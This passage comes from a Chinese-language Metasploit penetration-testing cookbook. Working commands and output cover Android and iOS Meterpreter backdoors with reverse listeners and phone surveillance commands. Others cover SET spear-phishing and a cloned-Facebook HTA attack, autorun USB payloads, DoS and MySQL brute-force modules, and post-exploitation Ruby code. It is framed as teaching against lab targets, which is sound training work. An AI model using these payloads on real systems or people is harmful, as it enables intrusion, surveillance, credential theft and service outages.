  | activity_start | 从 Uri 字符串启动 Android 活动 |\n| check_root | 检查设备是否已 root |\n| dump_calllog\
  \ | 获取通话记录 |\n| dump_contacts | 获取联系人列表 |\n| dump_sms | 获取短信消息 |\n| geolocate |\
  \ 使用地理定位获取当前经纬度 |\n| hide_app_icon | 从启动器中隐藏应用图标 |\n| interval_collect | 管理间隔收集功能\
  \ |\n| send_sms | 从目标会话发送短信 |\n| set_audio_mode | 设置铃声模式 |\n| sqlite_query | 查询存储中的\
  \ SQLite 数据库 |\n| wakelock | 启用/禁用 Wakelock |\n| wlan_geolocate | 使用 WLAN 信息获取当前经纬度\
  \ |\n\n```\nmeterpreter >\n```\n\n- 7. 查看 help 命令的输出，我们可以看到现在可以获取通话记录、读取和发送短信消息以及获取设备位置等。这结合摄像头命令，使我们能够访问设备的几乎所有功能：\n\
  \n```\nmeterpreter > help webcam\n```\n\n# Stdapi: 摄像头命令\n\n| Command | 描述 |\n|---|---|\n\
  | record_mic | 从默认麦克风录制 X 秒音频 |\n| webcam_chat | 启动视频聊天 |\n\n\n\n\n```\nwebcam_list\
  \      List webcams\nwebcam_snap      Take a snapshot from the specified webcam\n\
  webcam_stream    Play a video stream from the specified webcam\n\nmeterpreter >\n\
  ```\n\n## 还有更多...\n\nMetasploit 不仅限于 Android 设备，如果你有一台越狱的 arm64 iOS 设备，你也可以使用 msfvenom\
  \ 创建后门，使用 apple_ios/aarch64/meterpreter_reverse_tcp 有效载荷，并入侵该设备：\n\n```\nroot@kali:~#\
  \ msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=192.168.216.5 LPORT=443\
  \ -f macho -o iOS-backdoor\nNo platform was selected, choosing Msf::Module::Platform::Apple_iOS\
  \ from the payload\nNo Arch selected, selecting Arch: aarch64 from the payload\n\
  No encoder or badchars specified, outputting raw payload\nPayload size: 692552 bytes\n\
  Final size of macho file: 692552 bytes\n>Saved as: iOS-backdoor\nroot@kali:~#\n\
  ```\n"
- "## 17 社会工程工具包\n\n本章中，我们将介绍以下配方：\n\n- 使用社会工程工具包入门\n- 使用 spear-phishing 攻击向量\n- 网站攻击向量\n\
  - 使用多攻击 Web 方法\n- 感染性媒体生成器\n\n### 简介\n\n社会工程工具包（SET）是一个开源渗透测试框架，专门设计用于对人进行高级攻击，并已迅速成为渗透测试人员工具箱中的标准工具。SET\
  \ 是 TrustedSec, LLC 的产品——一家位于俄亥俄州克利夫兰的信息安全咨询公司。\n\n### 使用社会工程工具包入门\n\nSET 可以安装在\
  \ Linux 和 macOS 上；它预装在 Kali Linux 上，Kali Linux 也维护 SET 更新，这意味着你不必担心手动更新 SET。\n\n\
  ### 准备工作\n\nSET 可以从其 GitHub 仓库为不同平台下载：https://github.com/trustedsec/social-engineer-toolkit。只需浏览\
  \ README 文件并为你偏好的发行版安装依赖项，然后运行以下命令安装 SET：\n\n```\ngit clone https://github.com/trustedsec/social-engineer-toolkit/\
  \ set/ && cd set && python setup.py install\n```\n\n### 如何操作...\n\n要在 Kali Linux\
  \ 上启动 SET，打开终端窗口并运行 setoolkit 命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_651_0.png)\n\
  \n### 工作原理...\n\nSET 是一个基于 Python 的自动化工具，为我们创建了一个菜单驱动的应用程序。Python 更快的执行速度和多功能性使其成为开发\
  \ SET 等模块化工具的首选语言。\n\n在使用除 Kali Linux 之外的其他发行版使用 SET 时，你需要编辑 SET 配置文件，以确保所有攻击向量都能正常工作。例如，要在之前配方中使用的\
  \ Ubuntu 16.04.3 Droplet 中设置 SET，我们需要定义 Metasploit 的路径：\n\n```\n### Define the path\
  \ to Metasploit. For example:\n/opt/metasploit/apps/pro/msf3\nMETASPLOIT_PATH=/opt/metasploit-framework/bin\n\
  ```\n\n### 使用 spear-phishing 攻击向量\n\nspear-phishing 攻击向量是一种电子邮件攻击场景，用于向目标/特定用户发送恶意电子邮件。为了伪造你自己的电子邮件地址，你需要一个\
  \ sendmail 服务器。将配置设置更改为 SENDMAIL=ON。如果你的基于 Debian 的机器上未安装 sendmail，则可以通过输入以下命令下载：\n\
  \n```\napt install sendmail\n```\n\n### 如何操作...\n\nspear-phishing 模块为我们提供了三种不同的攻击向量：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_653_0.png)\n\n1. 我们先来分析一下。选择第一个选项将启动\
  \ **大规模邮件攻击**。攻击向量首先通过选择有效载荷开始。你可以从可用的 Metasploit 漏洞利用模块列表中选择任何漏洞：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_653_1.png)\n\
  \n2. 然后，我们将被提示选择一个有效载荷并指定侦听器的 IP 地址或 URL 以及端口。\n\n3. 在接下来的几个步骤中，我们将启动 sendmail 服务器，设置恶意文件格式的模板，并选择单次或群发邮件攻击：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_654_0.png)\n\n4. 然后，选择要使用的模板、受害者电子邮件地址以及用于电子邮件攻击的\
  \ Gmail 账户：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_654_1.png)\n\n设置自己的服务器可能并不非常可靠，因为大多数邮件服务使用反向查找来确保电子邮件是从与地址名称相同的域名生成的。\n\
  \n5. 接下来，SET 将使用资源脚本启动 Metasploit 并启动通用有效载荷处理程序：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_655_0.png)\n\
  \n### 网站攻击向量\n\nSET Web 攻击向量是一种利用多种基于 Web 的攻击来入侵目标受害者的独特方法。它是 SET 中迄今为止最受欢迎的攻击向量，具有以下攻击向量：\n\
  \n```\nset> 2\n\nThe Web Attack module is a unique way of utilizing multiple web-based\
  \ attacks in order to compromise the intended victim.\n\nThe Java Applet Attack\
  \ method will spoof a Java Certificate and deliver a metasploit based payload. Uses\
  \ a customized java applet created by Thomas Werth to deliver the payload.\n\nThe\
  \ Metasploit Browser Exploit method will utilize select Metasploit browser exploits\
  \ through an iframe and deliver a Metasploit payload.\n\nThe Credential Harvester\
  \ method will utilize web cloning of a web-site that has a username and password\
  \ field and harvest all the information posted to the website.\n\nThe TabNabbing\
  \ method will wait for a user to move to a different tab, then refresh the page\
  \ to something different.\n\nThe Web-Jacking Attack method was introduced by white_sheep,\
  \ emgent. This method utilizes iframe replacements to make the highlighted URL link\
  \ to appear legitimate however when clicked a window pops up then is replaced with\
  \ the malicious link. You can edit the link replacement settings in the set_config\
  \ if its too slow/fast.\n\nThe Multi-Attack method will add a combination of attacks\
  \ through the web attack menu. For example you can utilize the Java Applet, Metasploit\
  \ Browser, Credential Harvester/Tabnabbing all at once to see which is successful.\n\
  \nThe HTA Attack method will allow you to clone a site and perform powershell injection\
  \ through HTA files which can be used for Windows-based powershell exploitation\
  \ through the browser.\n\n1) Java Applet Attack Method\n2) Metasploit Browser Exploit\
  \ Method\n3) Credential Harvester Attack Method\n4) Tabnabbing Attack Method\n5)\
  \ Web Jacking Attack Method\n6) Multi-Attack Web Method\n7) Full Screen Attack Method\n\
  8) HTA Attack Method\n\n99) Return to Main Menu\n\nset:webattack>\n```\n\n### 如何操作...\n\
  \n我们已经在之前的配方中见过如何使用 HTA，但 SET 将其提升到了新的水平。\n\n1. 在 SET 中选择 HTA 攻击方法后，我们可以克隆一个站点，通过该站点传递我们的有效载荷，从而为用户打开\
  \ HTA 应用程序创建一个更有说服力的前提：\n\n```\nset:webattack>8\n\nThe first method will allow SET\
  \ to import a list of pre-defined web applications that it can utilize within the\
  \ attack.\n\nThe second method will completely clone a website of your choosing\
  \ and allow you to utilize the attack vectors within the completely same web application\
  \ you were attempting to clone.\n\nThe third method allows you to import your own\
  \ website, note that you should only have an index.html when using the import website\
  \ functionality.\n\n1) Web Templates\n2) Site Cloner\n3) Custom Import\n\n99) Return\
  \ to Webattack Menu\n\nset:webattack>2\n[-] SET supports both HTTP and HTTPS\n[-]\
  \ Example: http://www.thisisasfakesite.com\nset:webattack> Enter the url to clone:\
  \ https://facebook.com\n[*] HTA Attack Vector selected. Enter your IP, Port, and\
  \ Payload...\nset> IP address or URL (www.ex.com) for the payload listener (LHOST)\
  \ [45.55.45.143]:\nEnter the port for the reverse payload [443]:\nSelect the payload\
  \ you want to deliver:\n\n1. Meterpreter Reverse HTTPS\n2. Meterpreter Reverse HTTP\n\
  3. Meterpreter Reverse TCP\n\nEnter the payload number [1-3]: 1\n[*] Generating\
  \ powershell injection code and x86 downgrade attack...\n[*] Reverse_HTTPS takes\
  \ a few seconds to calculate..One moment..\nNo encoder or badchars specified, outputting\
  \ raw payload\n```\n\n\n\n2. 与大规模邮件攻击类似，SET 将使用资源脚本启动 Metasploit，并为我们启动通用有效载荷处理程序：\n\
  \n```\n[*] Embedding HTA attack vector and PowerShell injection...\n[*] Automatically\
  \ starting Apache for you...\n\n[*] Cloning the website: https://login.facebook.com/login.php\n\
  [*] This could take a little bit...\n[*] Copying over files to Apache server...\n\
  [*] Launching Metasploit.. Please wait one.\nThis copy of metasploit-framework is\
  \ more than two weeks old.\nConsider running 'msfupdate' to update to the latest\
  \ version.\n\nIIIIII      dTb.dTb\nII   4'  v  B   \"\"--\"\"--\"\"\nII   G.   .P\
  \   .\"//\"\\\nII   'T,  .;P'  .\"//\"\\\nII   'T, .P'    .\"//\"\\\nIIIIII  'Yv'\n\
  \nI love shells --egypt\n\n    =[ metasploit v4.16.24-dev ]\n+ -- --=[ 1713 exploits\
  \ - 972 auxiliary - 299 post ]\n+ -- --=[ 503 payloads - 41 encoders - 10 nops ]\n\
  + -- --=[ Free Metasploit Pro trial: http://r-7.co/try msp ]\n\n[*] Processing /root/.set//meta_config\
  \ for ERB directives.\nresource (/root/.set//meta_config)> use multi/handler\nresource\
  \ (/root/.set//meta_config)> set payload windows/meterpreter/reverse_https\npayload\
  \ => windows/meterpreter/reverse_https\nresource (/root/.set//meta_config)> set\
  \ LHOST 45.55.45.143\nLHOST => 45.55.45.143\nresource (/root/.set//meta_config)>\
  \ set LPORT 443\nLPORT => 443\nresource (/root/.set//meta_config)> set ExitOnSession\
  \ false\nExitOnSession => false\nresource (/root/.set//meta_config)> set EnableStageEncoding\
  \ true\nEnableStageEncoding => true\nresource (/root/.set//meta_config)> exploit\
  \ -j\n[*] Exploit running as background job 0.\n\n[*] Started HTTPS reverse handler\
  \ on https://45.55.45.143:443\nmsf exploit(multi/handler) >\n```\n\n3. 现在，当受害者浏览我们的恶意站点时，他们将被提示打开\
  \ HTA 应用程序；由于它来自一个已知网站，即我们克隆的网站，因此受害者更有可能运行它：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_659_0.png)\n\
  \n4. 当受害者打开 HTA 应用程序时，我们获得了一个新的会话：\n\n```\n[*] Started HTTPS reverse handler on\
  \ https://45.55.45.143:443\nmsf exploit(multi/handler) > [*] https://45.55.45.143:443\
  \ handling request from 89.114.197.227; (UUID: snz1Su6v) Encoded stage with x86/shikata_ga_nai\n\
  [*] https://45.55.45.143:443 handling request from 89.114.197.227; (UUID: snz1Su6v)\
  \ Staging x86 payload (180854 bytes) ...\n[*] Meterpreter session 1 opened (45.55.45.143:443\
  \ -> 89.114.197.227:55296) at 2017-12-30 14:30:40 +0000\n\nmsf exploit(multi/handler)\
  \ > sessions 1\n[*] Starting interaction with 1...\n\nmeterpreter > getuid\nServer\
  \ username: MSEDGEWIN10\\IEUser\nmeterpreter >\n```\n\n## 使用多攻击 Web 方法\n\n多攻击 Web\
  \ 方法通过将多个攻击组合成一个，使 Web 攻击更上一层楼。这种攻击方法允许我们在单一格式下统一多个漏洞利用和漏洞。一旦目标用户打开文件或 URL，则每个攻击将逐一尝试，除非报告了成功的攻击。SET\
  \ 自动化了将不同攻击归类到单一 Web 攻击场景下的过程。让我们继续前进，看看这是如何完成的：\n\n```\nMulti-Attack Web Attack\
  \ Vector\n[**************************************************]\nThe multi attack\
  \ vector utilizes each combination of attacks and allow the user to choose the method\
  \ for the attack. Once you select one of the attacks, it will be added to your attack\
  \ profile to be used to stage the attack vector. When your finished be sure to select\
  \ the 'I'm finished' option.\nSelect which attacks you want to use:\n1. Java Applet\
  \ Attack Method (OFF)\n2. Metasploit Browser Exploit Method (OFF)\n3. Credential\
  \ Harvester Attack Method (OFF)\n4. Tabnabbing Attack Method (OFF)\n5. Web Jacking\
  \ Attack Method (OFF)\n6. Use them all - A.K.A. 'Tactical Nuke'\n7. I'm finished\
  \ and want to proceed with the attack\n99. Return to Main Menu\nset;webattack;multiattack>\
  \ Enter selections one at a time (7 to finish):6\n```\n\n我们可以选择不同的攻击，完成后可以输入 7，最终将所选攻击组合到单一向量下。最后，我们将被提示选择有效载荷和后门编码器。\n\
  \n### 如何操作...\n\n一旦选择了不同的攻击，SET 将它们与有效载荷结合，并构建一个单一的恶意链接，该链接现在需要进行社会工程。我们必须构建一个看起来对目标用户完全合法的模板，并迫使其访问恶意链接。一旦受害者点击链接，不同的攻击将逐一尝试，除非成功发起攻击。一旦发现并利用漏洞，有效载荷将提供与\
  \ Metasploit 监听器的回连。\n\n## 感染性媒体生成器\n\n感染性媒体生成器是一个相对简单的攻击向量。SET 将创建基于 Metasploit\
  \ 的有效载荷，为您设置监听器，并生成一个需要刻录或写入 DVD/USB 驱动器的文件夹。一旦插入，如果启用了自动运行，代码将自动执行并接管机器：\n\n```\n\
  The Infectious USB/CD/DVD module will create an autorun.inf file and a\nMetasploit\
  \ payload. When the DVD/USB/CD is inserted, it will automatically\nrun if autorun\
  \ is enabled.\n\nPick the attack vector you wish to use: fileformat bugs or a straight\
  \ executable.\n\n1) File-Format Exploits\n2) Standard Metasploit Executable\n\n\
  99) Return to Main Menu\n\nset:infectious>\n```\n\n### 如何操作...\n\n该攻击向量基于一个简单的原理，即生成恶意可执行文件，然后使用可用编码器对其进行编码，以绕过防病毒保护。以下是一些感染性媒体生成器的示例及其描述：\n\
  \n```\nset::infectious>2\n\n1) Windows Shell Reverse_TCP          Spawn a command\
  \ shell on victim and send back to attacker\n2) Windows Reverse_TCP Meterpreter\
  \    Spawn a meterpreter shell on victim and send back to attacker\n3) Windows Reverse_TCP\
  \ VNC DLL        Spawn a VNC server on victim and send back to attacker\n4) Windows\
  \ Shell Reverse_TCP X64      Windows X64 Command Shell, Reverse TCP Inline\n5) Windows\
  \ Meterpreter Reverse_TCP X64 Connect back to the attacker (Windows x64), Meterpreter\n\
  6) Windows Meterpreter Egress Buster  Spawn a meterpreter shell and find a port\
  \ home via multiple ports\n7) Windows Meterpreter Reverse HTTPS  Tunnel communication\
  \ over HTTP using SSL and use Meterpreter\n8) Windows Meterpreter Reverse DNS  \
  \  Use a hostname instead of an IP address and use Reverse Meterpreter\n9) Download/Run\
  \ your Own Executable   Downloads an executable and runs it\n\nset::payloads>7\n\
  set::payloads> IP address for the payload listener (LHOST):45.55.45.143\nset::payloads>\
  \ Enter the PORT for the reverse listener:443\n[*] Generating the payload.. please\
  \ be patient.\n[*] Payload has been exported to the default SET directory located\
  \ under: /root/.set//payload.exe\n[*] Your attack has been created in the SET home\
  \ directory (/root/.set/) folder 'autorun'\n[*] Note a backup copy of template.pdf\
  \ is also in /root/.set/template.pdf if needed.\n[-] Copy the contents of the folder\
  \ to a CD/DVD/USB to autorun\nset> Create a listener right now [yes|no]: yes\n```\n\
  \n### 工作原理...\n\n在生成编码后的恶意文件后，Metasploit 监听器开始等待回连。此攻击的唯一限制是可移动媒体必须启用自动运行；否则需要手动触发。\n\
  \n这种类型的攻击向量在目标用户位于防火墙后面时可能有所帮助。如今大多数防病毒程序都会禁用自动运行，这反过来会使这种类型的攻击变得无用。渗透测试人员在进行基于自动运行的攻击时，还应确保提供后门、合法的可执行文件/PDF\
  \ 以及媒体。这将确保受害者必然执行其中一个有效载荷。\n"
- "## 18 使用模块进行渗透测试\n\n本章将介绍以下配方：\n\n- 使用辅助模块\n- DoS 攻击模块\n- 后利用模块\n- 理解模块构建的基础\n\
  - 分析现有模块\n- 构建自己的后利用模块\n- 构建自己的辅助模块\n\n### 简介\n\nMetasploit 框架具有模块化架构，这意味着其所有漏洞利用、有效载荷、编码器等都以模块的形式存在。模块化架构使扩展框架功能变得更容易。任何程序员都可以开发自己的模块并轻松地将其移植到框架中。\n\
  \n### 使用辅助模块\n\n我们在第 12 章《信息收集与扫描》中已经见过一些辅助模块，因此在本配方中我们将重点介绍一些最常用和最有帮助的辅助模块。\n\n\
  \n\n\n## 准备工作\n\n列出可用的辅助模块，我们可以在 `msfconsole` 中使用 `show auxiliary` 命令：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_664_0.png)\n\
  \n拥有近 1,000 个辅助模块，Metasploit 可能是目前最完整的渗透测试框架之一。\n\n## 如何操作...\n\n我们将从最有用的 HTTP 辅助模块之一\
  \ HTTP 目录扫描器开始。该模块可识别给定目录路径中是否存在有趣的目录。默认情况下，它使用 `wmap_dirs.txt` 词典，但你可以指定自己的词典；要运行该模块，我们需要设置目标\
  \ IP 地址、范围或 CIDR 标识符。\n\n- 1. 在此示例中，我使用了 Metasploitable 2 目标机器的 IP 地址：\n\n```\n\
  msf > use auxiliary/scanner/http/dir_scanner\nmsf auxiliary(scanner/http/dir_scanner)\
  \ >\nset RHOSTS 192.168.216.129\nRHOSTS => 192.168.216.129\nmsf auxiliary(scanner/http/dir_scanner)\
  \ > run\n\n[*] Detecting error code\n[*] Using code '404' as not found for 192.168.216.129\n\
  ```\n\n```\n[+] Found http://192.168.216.129:80/cgi-bin/\n404 (192.168.216.129)\n\
  [+] Found http://192.168.216.129:80/doc/ 200\n(192.168.216.129)\n[+] Found http://192.168.216.129:80/icons/\
  \ 200\n(192.168.216.129)\n[+] Found http://192.168.216.129:80/index/ 404\n(192.168.216.129)\n\
  [+] Found http://192.168.216.129:80/phpMyAdmin/ 200\n(192.168.216.129)\n[+] Found\
  \ http://192.168.216.129:80/test/ 404\n(192.168.216.129)\n[*] Scanned 1 of 1 hosts\
  \ (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/http/dir_scanner)\
  \ >\n```\n\n查看输出，我们可以看到它能够找到多个有趣的目录，例如 phpMyAdmin、test、doc、cgi-bin 等\n\n- 2. 另一个有用的辅助模块是\
  \ HTTP WebDAV 扫描器，可检测启用了 WebDAV 的 Web 服务器。要使用它，请设置要使用的 PATH 以及目标 IP 地址、范围或 CIDR\
  \ 标识符：\n\n```\nmsf > use auxiliary/scanner/http/webdav_scanner\nmsf auxiliary(scanner/http/webdav_scanner)\
  \ >\nset PATH /dav/\nPATH => /dav/\nmsf auxiliary(scanner/http/webdav_scanner) >\n\
  set RHOSTS 192.168.216.129\nRHOSTS => 192.168.216.129\nmsf auxiliary(scanner/http/webdav_scanner)\
  \ > run\n\n[+] 192.168.216.129 (Apache/2.2.8 (Ubuntu) DAV/2)\nhas WEBDAV ENABLED\n\
  [*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(scanner/http/webdav_scanner) >\n```\n\n- 3. 让我们讨论一个涉及一些额外输入的特定扫描模块。\n\
  \nMySQL 登录实用程序模块是一个暴力破解模块，它会扫描目标上 MySQL 服务器的可用性，并尝试通过暴力攻击登录数据库，使用 Metasploitable\
  \ 3 机器作为目标：\n\n```\nmsf > use auxiliary/scanner/mysql/mysql_login\nmsf auxiliary(scanner/mysql/mysql_login)\
  \ >\n```\n\n```\nset USERNAME root\nUSERNAME => root\nmsf auxiliary(scanner/mysql/mysql_login)\
  \ >\nset BLANK_PASSWORDS true\nBLANK_PASSWORDS => true\nmsf auxiliary(scanner/mysql/mysql_login)\
  \ >\nset RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(scanner/mysql/mysql_login)\
  \ > run\n\n[+] 192.168.216.10:3306 - 192.168.216.10:3306 -\nFound remote MySQL version\
  \ 5.5.20\n[+] 192.168.216.10:3306 - 192.168.216.10:3306 -\nSuccess: 'root:'\n[*]\
  \ Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(scanner/mysql/mysql_login) >\n```\n\n查看输出，我们可以看到我们能够使用用户名 root 和空白密码登录到\
  \ MySQL 服务器。\n\n## DoS 攻击模块\n\n在之前的章节中，我们学习了在各种攻击场景中使用 Metasploit。在本教程中，我们将重点关注拒绝服务（DoS）攻击。DoS\
  \ 攻击的重点是使资源无法用于其设计目的。DoS 模块帮助渗透测试人员在攻击服务时判断客户端是否容易受到此类攻击。因此，让我们详细讨论其中一些模块。\n\n##\
  \ 如何操作...\n\n在本教程中，我们将重点关注两种最常被攻击的协议，HTTP 和 SMB。\n\n## HTTP\n\n我们将首先查看 MS15-034\
  \ HTTP 协议栈请求处理拒绝服务辅助模块。该模块检查主机是否容易受到 CVE-2015-1635（MS15-034）的攻击，这是一个存在于 HTTP 协议栈（HTTP.sys）中的漏洞，可能导致任意代码执行。\n\
  \n- 1. 要使用该模块，请设置 Metasploitable 3 目标机器的目标 IP 地址并运行它：\n\n```\nmsf > use auxiliary/dos/http/ms15_034_ulonglongadd\n\
  msf auxiliary(dos/http/ms15_034_ulonglongadd) >\nset RHOSTS 192.168.216.10\nRHOSTS\
  \ => 192.168.216.10\nmsf auxiliary(dos/http/ms15_034_ulonglongadd) > run\n\n[*]\
  \ DOS request sent\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module\
  \ execution completed\nmsf auxiliary(dos/http/ms15_034_ulonglongadd) >\n```\n\n\
  查看目标机器，我们可以验证它容易受到此攻击的影响，该攻击导致机器崩溃并出现蓝屏死机：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_667_0.png)\n\
  \n## SMB\n\nSMB 是另一项多年来一直受到多个漏洞攻击的协议。SMBLoris 是针对 Microsoft Windows 操作系统的远程且无需凭据的\
  \ DoS 攻击。此攻击通过发送 SMB 请求并将 NetBios 会话服务（NBSS）长度标头值设置为最大可能值，从而在目标中消耗大量内存。影响从 Windows\
  \ 2000 到 Windows 10 的所有现代 Windows 版本，此攻击可能导致业务关键服务不可用。\n\n- 1. 在启动 `msfconsole`\
  \ 并使用 SMBLoris NBSS 拒绝服务辅助模块之前，我们必须更改系统中的打开文件限制。为此，我们可以使用 `-n` 选项的 `ulimit` 命令来设置打开文件数并将其设置为\
  \ 99999。然后，在 `msfconsole` 中加载模块，设置目标的 IP 地址并执行攻击：\n- 2. 在目标机器上，你应该会看到内存消耗迅速上升，直到机器停止：\n\
  \n```\nroot@kali:~# ulimit -n 99999\nroot@kali:~# msfconsole -q\nmsf > use auxiliary/dos/smb/smb_loris\n\
  msf auxiliary(dos/smb/smb_loris) >\nset RHOST 192.168.216.11\nRHOST => 192.168.216.11\n\
  msf auxiliary(dos/smb/smb_loris) > run\n\n[*] 192.168.216.11:445 - Sending packet\n\
  from Source Port: 1025\n[*] 192.168.216.11:445 - Sending packet\nfrom Source Port:\
  \ 1026\n[*] 192.168.216.11:445 - Sending packet\nfrom Source Port: 1027\n[*] 192.168.216.11:445\
  \ - Sending packet\nfrom Source Port: 1028\n[*] 192.168.216.11:445 - Sending packet\n\
  from Source Port: 1029\n...\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_669_0.png)\n\
  \nDoS 模块不仅允许我们验证系统是否容易受到攻击，还可以测试针对此类攻击的补丁和缓解措施是否有效。你会惊讶于仍容易受到这些攻击的系统数量之多，以及更新破坏先前补丁的频率有多高，从而使系统容易受到旧攻击。\n\
  \n## 后渗透模块\n\n后渗透模块可以在被攻破的目标上运行，以枚举目标、提升权限、收集凭据、进入目标网络等等。后渗透模块取代了已过时且不再受支持的 Meterpreter\
  \ 脚本。\n\n## 准备工作\n\n拥有超过 300 个后渗透模块，Metasploit 已成为世界上最完整的后渗透工具之一，并且多亏了社区，它正以快速的速度发展。\n\
  \n## 如何操作...\n\n让我们看看一些后渗透模块以及如何使用它们。在本教程中，我们将使用 Windows Powershell 执行后渗透模块在 Meterpreter\
  \ 会话中执行 PowerShell 脚本。\n\n首先，我们需要在 Metasploitable 3 目标机器上获取一个会话；为此，我们可以使用 Microsoft\
  \ Windows 已认证用户代码执行漏洞利用模块，然后加载 Windows Powershell 执行后渗透模块，设置 Meterpreter 会话，并指定我们希望在此示例中执行的\
  \ PowerShell 命令 $Host ：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_670_0.png)\n\
  \n成功执行该模块会显示 $Host 命令的结果。后渗透模块为我们提供了强大的后渗透功能，并允许我们自动化最重复的任务。因此，如果你想为 Metasploit\
  \ 社区做出贡献，那么你可以从事后渗透模块的工作。\n\n\n\n\n## 理解模块构建的基础\n\n到目前为止，我们已经看到了模块的有用性以及它们可以为框架增加的强大功能。为了掌握框架，了解构建和操作模块至关重要。这将帮助我们根据需要快速扩展框架。在接下来的几个配方中，我们将看到如何使用\
  \ Ruby 脚本来构建自己的模块并将其导入框架。\n\n### 如何操作...\n\n让我们从模块构建的一些基础开始：\n\n- 1. 在第一行，`require`\
  \ 方法指定此模块需要加载哪些库：\n  \n      ```\n      require 'msf/core/post/windows/powershell'\n\
  \      ```\n- 2. 以下行定义继承 post 家族属性的类。`post` 模块可以导入多种功能，例如访问文件系统、使用注册表、WMI、LDAP 等：\n\
  \  \n      ```\n      class MetasploitModule < Msf::Post\n      ```\n- 3. `include`\
  \ 语句可用于将框架的特定功能包含到我们自己的模块中。例如，如果我们正在构建一个 `post` 模块，我们可以将其包含为：\n  \n      ```\n \
  \     include Msf::Post::\n      ```\n- 4. 以下行将把 PowerShell 功能包含到模块中：\n  \n    \
  \  ```\n      include Msf::Post::Windows::Powershell\n      ```\n- 5. 以下行包含模块信息，例如模块名称、描述、许可证、作者、平台等：\n\
  \  \n      ```\n      def initialize(info={})\n        super(update_info(info,\n\
  \        'Name' => \"Windows Powershell Execution Post Module\",\n        'Description'\
  \ => %q{\n      This module will execute a powershell script in\n      a meterpreter\
  \ session.\n      ```\n\n用户还可以在执行前在内存中输入要进行的文本替换。\n将 VERBOSE 设置为 true 将输出执行前的脚本以及结果。\n\
  \n```\n},\n'License' => MSF_LICENSE,\n'Platform' => ['windows'],\n'SessionTypes'\
  \ => ['meterpreter'],\n'Author' => [\n'Nicholas Nam (nick[at]executionflow.org)',\n\
  # original meterpreter script\n'RageLtMan' # post module and libs\n]\n))\n```\n\n\
  - 6. register_options 允许我们为必需参数设置默认值：\n\n```\nregister_options(\n\n[\nOptString.new('SCRIPT',\
  \ [true, 'Path to the local PS script or command string to execute']),\n])\n\nregister_advanced_options(\n\
  [\nOptString.new('SUBSTITUTIONS', [false, 'Script subs in gsub format - original,sub;original,sub']),\n\
  ])\n```\n\n- 7. 最后，run 方法是实际代码所在的位置：\n\n```\ndef run\n# Make sure we meet the requirements\
  \ before running\nthe script, note no need to return\n# unless error\nraise \"Powershell\
  \ not available\" if !\nhave_powershell?\n\n# Preprocess the Powershell::Script\
  \ object with\nsubstitutions from Exploit::Powershell\nscript = make_subs(read_script\n\
  (datastore['SCRIPT']), process_subs\n(datastore['SUBSTITUTIONS']))\n\n# Execute\
  \ in session\n```\n\n```\nprint_status psh_exec(script)\nprint_good \"Finished!\"\
  \nend\n```\n\n分析内置脚本是学习更多脚本构建的最佳方式。有大量文档可用于学习模块构建，但学习 Ruby 的最佳方式是分析现有模块。\n\n## 分析现有模块\n\
  \n现在我们在之前的配方中积累了一些关于模块构建的背景知识，下一步将是分析现有模块。\n\n### 准备工作\n\n我们将分析一个 Windows Powershell\
  \ Execution Post Module，以便更深入地了解模块构建。\n\n我们将从上一个配方中离开的地方继续。我们已经在上一个配方中讨论了模块的基本模板，因此在这里我们将从脚本的主体开始。\n\
  \n我们可以在以下位置找到 Windows Powershell Execution Post Module：\n\n/usr/share/metasploit-framework/modules/post/windows/manage/exec_powershell.rb\n\
  \n### 如何操作...\n\n让我们从分析模块的 run 方法开始，以了解其工作原理：\n\n```\ndef run\n  raise \"Powershell\
  \ not available\" if ! have_powershell?\n  script = make_subs(read_script(datastore['SCRIPT']),\n\
  process_subs(datastore['SUBSTITUTIONS']))\n\n  print_status psh_exec(script)\n \
  \ print_good 'Finished!'\nend\n```\n\n- 1. 首先，它验证是否满足要求，在本例中是 PowerShell 是否可用；如果不可用则引发异常：\n\
  \  \n  ```\n  raise \"Powershell not available\" if ! have_powershell?\n  ```\n\
  - 2. 接下来，它读取并预处理提供的 PowerShell 脚本，并将结果保存在名为 `script` 的变量中：\n  \n  ```\n  script\
  \ = make_subs(read_script(datastore['SCRIPT']),\n  process_subs(datastore['SUBSTITUTIONS'])\n\
  \  ```\n- 3. 最后，它使用预处理的 PowerShell 脚本作为参数调用 `psh_exec` 方法，并使用 `print_status` 将输出打印到屏幕，然后打印单词\
  \ `Finished!` 并使用 `print_good`，该方法会在输出前附加特征的 [+] 绿色标记：\n  \n  ```\n  print_status\
  \ psh_exec(script)\n  print_good 'Finished!'\n  ```\n\n这是在框架内 post 模块工作原理的快速介绍。您可以根据需要相应地更改现有脚本。这使得平台对于开发来说极其便携。\n\
  \n## 构建自己的后利用模块\n\n现在，我们已经涵盖了足够的模块构建背景知识。在本配方中，我们将看到如何构建自己的模块并将其添加到框架中的示例。构建模块非常方便，因为它们赋予我们根据需要扩展框架的能力。\n\
  \n### 准备工作\n\n让我们构建一个小型后利用模块，该模块将使用 PowerShell 枚举域中的所有用户。我们已经知道如何使用 Windows Powershell\
  \ Execution Post Module 运行 PowerShell 脚本；然而，输入 PowerShell 命令或为常见任务维护单独的脚本文件可能令人生畏且容易出错。\n\
  \n### 如何操作...\n\nPost 模块根据其行为进行分类，如官方文档中以下列表所示：\n\n| 类别 | 描述 |\n|---|---|\n| gather\
  \ | 涉及数据收集/收集/枚举的模块。 |\n| gather/credentials | 用于窃取凭据的模块。 |\n| gather/forensics\
